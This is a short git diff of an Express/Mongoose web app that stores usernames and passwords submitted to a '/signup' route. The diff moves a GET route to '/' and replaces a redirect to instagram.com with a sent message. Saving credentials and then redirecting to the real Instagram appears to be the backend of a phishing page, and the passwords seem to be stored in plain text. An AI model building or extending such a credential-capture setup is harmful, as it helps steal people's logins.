@@ -21,11 +21,13 @@ let Usermodel = new mongoose.Schema({
 // middleware
 app.use(bodyparser.urlencoded({ extended: true }));
 app.use(ex.urlencoded({ extended: true }));
+
+app.use(ex.static(path.join(__dirname, 'public')))
  // view engine
 app.set('view engine' , 'ejs');
 app.set('views', path.resolve('./'));
 // routv,es
-app.get('/signup' ,(req , res) => {
+app.get('/' ,(req , res) => {
   res.render('Fail');
 });
 app.post('/signup', async (req, res) => {
@@ -34,7 +36,7 @@ app.post('/signup', async (req, res) => {
     username,
     password
   });
- return  res.redirect("https://www.instagram.com/");
+ return  res.send("your massage has been send , 💕🔝");
 });
  // listeing
  app.listen(PORT , () => console.log('server started'));
